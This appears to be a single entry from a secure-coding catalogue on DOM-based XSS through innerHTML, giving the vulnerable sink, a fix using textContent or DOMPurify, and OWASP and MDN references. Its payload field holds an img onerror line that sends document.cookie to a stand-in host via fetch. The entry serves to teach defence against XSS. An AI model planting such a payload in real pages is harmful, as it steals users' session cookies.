---
order: 1
cwe: 79
title: DOM XSS through innerHTML
category: injection
severity: critical
sink: |-
    el.innerHTML = user.bio
payload: |-
    <img src=x onerror="fetch('//evil.sh?c='+document.cookie)">
fix: |
    el.textContent = user.bio;
    // markup you must render → DOMPurify.sanitize(html)
refs:
    - https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
    - https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API
---

Your `<script>` tags don't run through `innerHTML`. My `onerror` does. I find the same door behind `v-html`, `dangerouslySetInnerHTML` and `insertAdjacentHTML`.
